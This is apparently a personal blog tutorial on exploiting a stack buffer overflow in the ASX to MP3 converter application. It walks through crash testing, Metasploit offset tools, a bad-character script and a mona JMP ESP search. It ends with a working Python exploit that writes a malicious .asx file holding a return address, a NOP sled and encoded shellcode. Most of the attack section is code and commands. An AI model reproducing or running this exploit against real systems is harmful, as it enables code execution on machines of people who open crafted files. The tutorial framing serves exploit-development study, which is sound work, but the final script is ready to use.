---
layout: post
title:  "Buffer Overflow Basics"
description: Introduction to my blog
date:   2020-08-01 13:03:36 +0530
categories: bufferoverflow
---

### Here is one to exploit a buffer overflow vulnerability in the ASX to MP3 application.

## Spiking (Manual)
- As the application uses asx files as input, generated 5 files Initially to identify the length which the application rewrites the EIP and crashed.
- 30000 (Appcrash)  – 20000 (Appcrash) – 10000 (No Appcrash) – 15000 (No Crash) – 18000 (Crashes Again)
- The following trial and error method indicated that the application crashed between 15000 to 18000 characters input.

## Fuzzing
We can use the pattern create and pattern offset Metasploit tools to create a cyclical pattern and determine the exact offset of EIP

```
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

Note that EIP is overwritten with 44386344
 
Second, use the Pattern Offset tool to determine the exact offset of EIP.

```
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 44386344
```


## Verifying EIP Control

Use the initial ‘A’ generation program, add 4 B's and use the same program to write 593 C's to a text file then load this into the converter application.

## Finding Bad Characters

Use the above code to identify bad character which needs to be removed from shellcode
```
import string  
  
f=open("basefile.txt", "r")  
if f.mode == 'r':  
    contents =f.read()  
	  
badchars = ("\x90\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"  
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"  
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"  
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"  
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"  
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"  
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"  
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")  
  
  
junk = "A" * 17403 + "BBBB" + badchars + "C" * (593-256)  
  
with open('payload.asx’,’w’) as file:  
    file.write(contents)  
    file.write(junk)  
 ```   
Badchars found: \x00 \x09 \x0A
 
## Find JMP ESP command with mona.py to insert as return address.
 
Run Mona to determine files available for use as JMP ESP call. This command allows us to reliably jump to the stack pointer held in the CPU. Note that MSA2Mfilter03.dll has both ASLR and REBASE listed as FALSE so it is a reliable location in memory to use for our JMP ESP command.


```
!mona  jmp -r esp -m MSA2Mfilter03.dll
```


![N|Solid](https://raw.githubusercontent.com/farhankn/farhankn.github.io/master/assets/buf1.png)
![N|Solid](https://raw.githubusercontent.com/farhankn/farhankn.github.io/master/assets/buf2.png)
![N|Solid](https://raw.githubusercontent.com/farhankn/farhankn.github.io/master/assets/buf3.png)
![N|Solid](https://raw.githubusercontent.com/farhankn/farhankn.github.io/master/assets/buf4.png)
![N|Solid](https://raw.githubusercontent.com/farhankn/farhankn.github.io/master/assets/buf5.png)


## Final Code with Padding and NOP Buffer
```
buf =  b""
buf += b"\xdb\xce\xd9\x74\x24\xf4\xb8\xd3\xce\x49\x36\x5b\x31"
buf += b"\xc9\xb1\x31\x31\x43\x18\x03\x43\x18\x83\xc3\xd7\x2c"
buf += b"\xbc\xca\x3f\x32\x3f\x33\xbf\x53\xc9\xd6\x8e\x53\xad"
buf += b"\x93\xa0\x63\xa5\xf6\x4c\x0f\xeb\xe2\xc7\x7d\x24\x04"
buf += b"\x60\xcb\x12\x2b\x71\x60\x66\x2a\xf1\x7b\xbb\x8c\xc8"
buf += b"\xb3\xce\xcd\x0d\xa9\x23\x9f\xc6\xa5\x96\x30\x63\xf3"
buf += b"\x2a\xba\x3f\x15\x2b\x5f\xf7\x14\x1a\xce\x8c\x4e\xbc"
buf += b"\xf0\x41\xfb\xf5\xea\x86\xc6\x4c\x80\x7c\xbc\x4e\x40"
buf += b"\x4d\x3d\xfc\xad\x62\xcc\xfc\xea\x44\x2f\x8b\x02\xb7"
buf += b"\xd2\x8c\xd0\xca\x08\x18\xc3\x6c\xda\xba\x2f\x8d\x0f"
buf += b"\x5c\xbb\x81\xe4\x2a\xe3\x85\xfb\xff\x9f\xb1\x70\xfe"
buf += b"\x4f\x30\xc2\x25\x54\x19\x90\x44\xcd\xc7\x77\x78\x0d"
buf += b"\xa8\x28\xdc\x45\x44\x3c\x6d\x04\x02\xc3\xe3\x32\x60"
buf += b"\xc3\xfb\x3c\xd4\xac\xca\xb7\xbb\xab\xd2\x1d\xf8\x44"
buf += b"\x99\x3c\xa8\xcc\x44\xd5\xe9\x90\x76\x03\x2d\xad\xf4"
buf += b"\xa6\xcd\x4a\xe4\xc2\xc8\x17\xa2\x3f\xa0\x08\x47\x40"
buf += b"\x17\x28\x42\x23\xf6\xba\x0e\x8a\x9d\x3a\xb4\xd2"



fuzz = "A" * 17424 + "\x73\xdf\x03\x10" + "FFFF" + "\x90" * 16 + buf +"C" * 300
with open('payload.asx','w') as file:
    file.write(fuzz)

```
